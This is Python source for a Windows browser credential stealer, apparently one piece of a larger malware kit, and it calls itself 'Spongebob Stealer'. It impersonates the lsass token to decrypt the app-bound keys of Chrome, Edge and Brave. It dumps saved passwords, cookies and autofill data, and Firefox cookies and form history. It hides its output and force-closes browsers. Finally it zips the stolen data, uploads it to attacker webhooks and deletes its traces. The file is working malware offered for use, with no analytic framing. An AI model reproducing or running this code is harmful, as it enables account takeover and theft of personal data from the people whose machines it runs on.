import os
import io
import json
import sys
import struct
import ctypes
import shutil
import windows
import sqlite3
import pathlib
import binascii
import subprocess
import configparser
import tempfile
import requests
import zipfile
import windows.crypto
import windows.security
import windows.generated_def as gdef
from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305

BROWSERS = {
    'chrome': {
        'name': 'Google Chrome',
        'data_path': r'AppData\Local\Google\Chrome\User Data',
        'local_state': r'AppData\Local\Google\Chrome\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chromekey1'
    },
    'brave': {
        'name': 'Brave',
        'data_path': r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
        'local_state': r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
        'process_name': 'brave.exe',
        'key_name': 'Brave Softwarekey1'
    },
    'edge': {
        'name': 'Microsoft Edge',
        'data_path': r'AppData\Local\Microsoft\Edge\User Data',
        'local_state': r'AppData\Local\Microsoft\Edge\User Data\Local State',
        'process_name': 'msedge.exe',
        'key_name': 'Microsoft Edgekey1'
    },
    'firefox': {
        'name': 'Mozilla Firefox',
        'data_path': r'AppData\Roaming\Mozilla\Firefox',
        'process_name': 'firefox.exe'
    }
}

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    parsed_data['flag'] = buffer.read(1)[0]
    if parsed_data['flag'] in (1, 2):
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        parsed_data['raw_data'] = buffer.read()
    return parsed_data

def decrypt_with_cng(input_data, key_name="Google Chromekey1"):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"
    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
                                  ctypes.byref(pcbResult), 0x40)
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict, key_name="Google Chromekey1") -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    else:
        return parsed_data.get('raw_data', b'')

def decrypt_v20_value(encrypted_value, master_key):
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted[32:].decode('utf-8')
    except Exception as e:
        return None

def decrypt_v20_password(encrypted_value, master_key):
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode('utf-8')
    except Exception as e:
        return None

def fetch_sqlite_copy(db_path):
    tmp_path = pathlib.Path(os.environ['TEMP']) / pathlib.Path(db_path).name
    shutil.copy2(db_path, tmp_path)
    return tmp_path

def get_firefox_base_path():
    """Firefox base path'ini döndürür"""
    if sys.platform.startswith("win"):
        return os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
    elif sys.platform.startswith("darwin"):
        return os.path.expanduser("~/Library/Application Support/Firefox")
    else:
        return os.path.expanduser("~/.mozilla/firefox")

def find_firefox_profiles():
    """Firefox profiles.ini dosyasından tüm profile'ları bulur"""
    base_path = get_firefox_base_path()
    ini_path = os.path.join(base_path, "profiles.ini")
    
    if not os.path.exists(ini_path):
        return []
    
    profiles = []
    config = configparser.RawConfigParser()
    config.read(ini_path)
    
    for section in config.sections():
        if config.has_option(section, "Path"):
            path = config.get(section, "Path")
            name = config.get(section, "Name") if config.has_option(section, "Name") else path
            is_relative = config.getboolean(section, "IsRelative", fallback=True)
            
            if is_relative:
                full_path = os.path.join(base_path, path)
            else:
                full_path = path
            
            profiles.append({
                'name': name,
                'path': path,
                'full_path': full_path
            })
    
    return profiles

def get_master_key(browser_config):
    try:
        user_profile = os.environ['USERPROFILE']
        local_state_path = os.path.join(user_profile, browser_config['local_state'])
        
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        if "os_crypt" in local_state and "app_bound_encrypted_key" in local_state["os_crypt"]:
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["app_bound_encrypted_key"])[4:]
        elif "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["encrypted_key"])[5:]
            return windows.crypto.dpapi.unprotect(key_blob_encrypted)
        else:
            return None
            
        with impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        
        if parsed_data['flag'] not in (1, 2, 3):
            return key_blob_user_decrypted[-32:]
            
        return derive_v20_master_key(parsed_data, browser_config['key_name'])
    except Exception as e:
        return None


def process_firefox(profile_info):
    """Firefox profile'ından tüm cookie'leri ve autofill verilerini çıkarır"""
    profile_full_path = profile_info['full_path']
    profile_name = profile_info['name'].lower().replace(" ", "_")
    
    profile_output_dir = pathlib.Path("firefox") / profile_name
    profile_output_dir.mkdir(parents=True, exist_ok=True)
    cookies_file = profile_output_dir / "cookies.txt"
    autofill_file = profile_output_dir / "auto_fills.txt"
    
    cookie_db_path = os.path.join(profile_full_path, "cookies.sqlite")
    formhistory_db_path = os.path.join(profile_full_path, "formhistory.sqlite")
    
    # Cookie'leri çıkar
    if os.path.exists(cookie_db_path):
        try:
            # Geçici kopya oluştur
            temp_dir = tempfile.mkdtemp()
            temp_db_path = os.path.join(temp_dir, "cookies.sqlite")
            shutil.copy2(cookie_db_path, temp_db_path)
            
            # WAL ve SHM dosyalarını da kopyala
            for suffix in ["-wal", "-shm"]:
                src = cookie_db_path + suffix
                if os.path.exists(src):
                    shutil.copy2(src, temp_db_path + suffix)
            
            # SQLite'dan tüm cookie'leri çek
            conn = sqlite3.connect(f"file:{temp_db_path}?mode=ro", uri=True)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT host, path, isSecure, expiry, name, value, isHttpOnly
                FROM moz_cookies
                ORDER BY host, name
            """)
            cookies = cursor.fetchall()
            conn.close()
            
            # Geçici dizini temizle
            shutil.rmtree(temp_dir)
            
            # Cookie'leri Netscape formatında kaydet
            with open(cookies_file, "w", encoding="utf-8") as f:
                for host, path, is_secure, expiry, name, value, is_httponly in cookies:
                    # Netscape cookie formatı:
                    # domain  flag  path  secure  expiration  name  value
                    flag = "TRUE"
                    secure = "TRUE" if is_secure else "FALSE"
                    # Expiry değeri Unix timestamp veya 0 ise uzun tarih ver
                    if expiry and expiry > 0:
                        expiration = expiry
                    else:
                        expiration = 2597573456  # Uzak tarih
                    
                    line = f"{host}\t{flag}\t{path}\t{secure}\t{expiration}\t{name}\t{value}\n"
                    f.write(line)
        except Exception as e:
            pass
    
    # Autofill verilerini çıkar (formhistory.sqlite)
    if os.path.exists(formhistory_db_path):
        try:
            # Geçici kopya oluştur
            temp_dir = tempfile.mkdtemp()
            temp_db_path = os.path.join(temp_dir, "formhistory.sqlite")
            shutil.copy2(formhistory_db_path, temp_db_path)
            
            # WAL ve SHM dosyalarını da kopyala
            for suffix in ["-wal", "-shm"]:
                src = formhistory_db_path + suffix
                if os.path.exists(src):
                    shutil.copy2(src, temp_db_path + suffix)
            
            # SQLite'dan autofill verilerini çek
            conn = sqlite3.connect(f"file:{temp_db_path}?mode=ro", uri=True)
            cursor = conn.cursor()
            
            # moz_formhistory tablosundan veri çek
            try:
                cursor.execute("""
                    SELECT fieldname, value, timesUsed, firstUsed, lastUsed
                    FROM moz_formhistory
                    ORDER BY fieldname, timesUsed DESC
                """)
                form_history = cursor.fetchall()
            except:
                form_history = []
            
            # moz_inputhistory tablosundan veri çek (varsa)
            try:
                cursor.execute("""
                    SELECT input, firstUsed, lastUsed
                    FROM moz_inputhistory
                    ORDER BY firstUsed DESC
                """)
                input_history = cursor.fetchall()
            except:
                input_history = []
            
            conn.close()
            
            # Geçici dizini temizle
            shutil.rmtree(temp_dir)
            
            # Autofill verilerini kaydet
            with open(autofill_file, "w", encoding="utf-8") as f:
                # Form history
                for fieldname, value, times_used, first_used, last_used in form_history:
                    if fieldname and value:
                        line = f"Field: {fieldname}\nValue: {value}\nTimes Used: {times_used}\n\n"
                        f.write(line)
                
                # Input history
                for input_val, first_used, last_used in input_history:
                    if input_val:
                        line = f"Input: {input_val}\n\n"
                        f.write(line)
        except Exception as e:
            pass

def process_browser(browser_name, browser_config):
    user_profile = os.environ['USERPROFILE']
    browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
    
    if not browser_data_path.exists():
        return
        
    master_key = get_master_key(browser_config) if 'key_name' in browser_config else None
    
    profiles = [p for p in browser_data_path.iterdir() if
                p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
    
    for profile_dir in profiles:
        profile_name = profile_dir.name.lower()
        profile_output_dir = pathlib.Path(browser_name) / profile_name
        profile_output_dir.mkdir(parents=True, exist_ok=True)
        password_file = profile_output_dir / "passwords.txt"
        autofill_file = profile_output_dir / "auto_fills.txt"
        cookies_file = profile_output_dir / "cookies.txt"
        cookie_db_path = profile_dir / "Network" / "Cookies"
        login_db_path = profile_dir / "Login Data"
        webdata_db_path = profile_dir / "Web Data"

        try:
            if cookie_db_path.exists() and master_key:
                cookie_copy = fetch_sqlite_copy(cookie_db_path)
                con = sqlite3.connect(cookie_copy)
                cur = con.cursor()
                cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;")
                cookies = cur.fetchall()
                with open(cookies_file, "a", encoding="utf-8") as f:
                    for host, name, path, expires, secure, httponly, encrypted_value in cookies:
                        if encrypted_value and encrypted_value[:3] == b"v20":
                            decrypted = decrypt_v20_value(encrypted_value, master_key)
                            value_str = decrypted if decrypted else "DECRYPT_FAILED"
                            line = f"{host}\tTRUE\t{path}\t{str(secure).upper()}\t{2597573456}\t{name}\t{value_str}\n"
                            f.write(line)
                con.close()
        except:
            pass

        try:
            if login_db_path.exists() and master_key:
                con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
                cur = con.cursor()
                cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;")
                logins = cur.fetchall()
                with open(password_file, "a", encoding="utf-8") as f:
                    for login in logins:
                        if login[2] and login[2][:3] == b"v20":
                            decrypted = decrypt_v20_password(login[2], master_key)
                            line = f"URL: {login[0]}\nLogin: {login[1]}\nPassword: {decrypted if decrypted else 'DECRYPT_FAILED'}\n\n"
                            f.write(line)
                con.close()
        except:
            pass

        try:
            if webdata_db_path.exists() and master_key:
                con = sqlite3.connect(fetch_sqlite_copy(webdata_db_path))
                cur = con.cursor()
                cur.execute("SELECT name, value FROM autofill;")
                autofills = cur.fetchall()
                with open(autofill_file, "a", encoding="utf-8") as f:
                    for name, value in autofills:
                        if name and name.strip():
                            if isinstance(value, bytes) and value[:3] == b"v20":
                                decrypted = decrypt_v20_value(value, master_key)
                                value_str = decrypted if decrypted else "DECRYPT_FAILED"
                            else:
                                value_str = value
                            line = f"Field: {name}\nValue: {value_str}\n\n"
                            f.write(line)
                con.close()
        except:
            pass

def main():
    # Console çıktısını gizle
    import sys
    import os
    
    # stdout ve stderr'i devre dışı bırak
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    
    # Tarayıcıları kapat
    for browser_name, browser_config in BROWSERS.items():
        if 'process_name' in browser_config:
            try:
                subprocess.run(["taskkill", "/F", "/IM", browser_config['process_name']], 
                             capture_output=True, text=True)
            except:
                pass
    
    keys_output_dir = pathlib.Path("decrypted_keys")
    keys_output_dir.mkdir(exist_ok=True)
    
    # Chrome/Edge/Brave master key'leri çıkar
    for browser_name, browser_config in BROWSERS.items():
        if browser_name == 'firefox':
            continue
            
        user_profile = os.environ['USERPROFILE']
        browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
        
        if not browser_data_path.exists():
            continue
            
        master_key = get_master_key(browser_config)
        
        if master_key:
            key_file = keys_output_dir / f"{browser_name}_master_key.txt"
            with open(key_file, "w", encoding="utf-8") as f:
                f.write(f"Browser: {browser_config['name']}\n")
                f.write(f"Master Key (hex): {master_key.hex()}\n")
                f.write(f"Master Key (base64): {binascii.b2a_base64(master_key).decode().strip()}\n")
    
    # Chrome/Edge/Brave verilerini çıkar
    for browser_name, browser_config in BROWSERS.items():
        if browser_name == 'firefox':
            continue
            
        user_profile = os.environ['USERPROFILE']
        browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
        
        if browser_data_path.exists():
            process_browser(browser_name, browser_config)
    
    # Firefox cookie'lerini çıkar
    firefox_profiles = find_firefox_profiles()
    for profile_info in firefox_profiles:
        try:
            process_firefox(profile_info)
        except Exception as e:
            pass

def zip_and_send_to_webhook(webhook_url, api_webhook_url=None):
    """Tüm çıkarılan dosyaları ZIP'leyip webhook'lara gönder"""
    try:
        zip_filename = f"{os.environ.get('USERNAME', 'user')}_BackupCookies_{int(__import__('time').time() * 1000)}.zip"
        zip_path = pathlib.Path(zip_filename)
        
        file_count = 0
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Tüm browser klasörlerini ZIP'e ekle
            for root, dirs, files in os.walk('.'):
                # decrypted_keys klasörünü atla
                if 'decrypted_keys' in root:
                    continue
                    
                for file in files:
                    if file.endswith('.txt') and not file.startswith('.'):
                        file_path = pathlib.Path(root) / file
                        if file_path.exists():
                            # Relatif path kullan
                            if root == '.':
                                arcname = file
                            else:
                                arcname = file_path
                            zipf.write(file_path, arcname)
                            file_count += 1
        
        zip_size = zip_path.stat().st_size / (1024 * 1024)  # MB
        
        embed_data = {
            'title': '<:mastercard_spacex:1429086506781511771> Browser Infos',
            'fields': [
                {'name': '<a:billing_name:1429086527417221120> PC Name', 'value': f'`{os.environ.get("COMPUTERNAME", "Unknown")}`', 'inline': True}
            ],
            'color': 0x000000,
            'timestamp': __import__("datetime").datetime.utcnow().isoformat() + 'Z'
        }
        
        payload_json = json.dumps({
            'username': 'Spongebob Stealer',
            'content': '<:mastercard_spacex:1429086506781511771> **Browser Infos**',
            'embeds': [embed_data]
        })
        
        # Hem kullanıcı webhook'una hem de API webhook'una gönder
        webhooks_to_send = []
        if webhook_url and webhook_url != '%WEBHOOK%':
            webhooks_to_send.append(webhook_url)
        if api_webhook_url and api_webhook_url != '%API_WEBHOOK%':
            webhooks_to_send.append(api_webhook_url)
        
        if not webhooks_to_send:
            return
        
        for url in webhooks_to_send:
            try:
                with open(zip_path, 'rb') as f:
                    files = {'file': (zip_filename, f, 'application/zip')}
                    data = {'payload_json': payload_json}
                    
                    response = requests.post(url, files=files, data=data, timeout=60)
            except Exception as e:
                pass
        
        # ZIP dosyasını sil
        zip_path.unlink()
        
        # Çıkarılan klasörleri temizle
        for item in pathlib.Path('.').iterdir():
            if item.is_dir() and item.name in ['chrome', 'brave', 'edge', 'firefox', 'decrypted_keys']:
                shutil.rmtree(item, ignore_errors=True)
            elif item.is_file() and item.suffix == '.txt' and not item.name.startswith('.'):
                item.unlink(missing_ok=True)
                
    except Exception as e:
        pass

if __name__ == "__main__":
    if not is_admin():
        sys.exit(1)
    
    # Webhook URL'lerini command line argümanından veya environment variable'dan al
    webhook_url = None
    api_webhook_url = None
    
    # Önce command line argümanından kontrol et
    if len(sys.argv) > 1:
        webhook_url = sys.argv[1]
    if len(sys.argv) > 2:
        api_webhook_url = sys.argv[2]
    
    # Yoksa environment variable'dan al
    if not webhook_url:
        webhook_url = os.environ.get('WEBHOOK_URL')
    if not api_webhook_url:
        api_webhook_url = os.environ.get('API_WEBHOOK_URL')
    
    # %WEBHOOK% ve %API_WEBHOOK% placeholder'larını kontrol et (main.js replace edecek)
    if webhook_url == '%WEBHOOK%':
        webhook_url = None
    if api_webhook_url == '%API_WEBHOOK%':
        api_webhook_url = None
    
    if not webhook_url and not api_webhook_url:
        sys.exit(1)
    
    # Ana işlemi çalıştır
    main()
    
    # ZIP oluştur ve webhook'lara gönder
    zip_and_send_to_webhook(webhook_url, api_webhook_url)
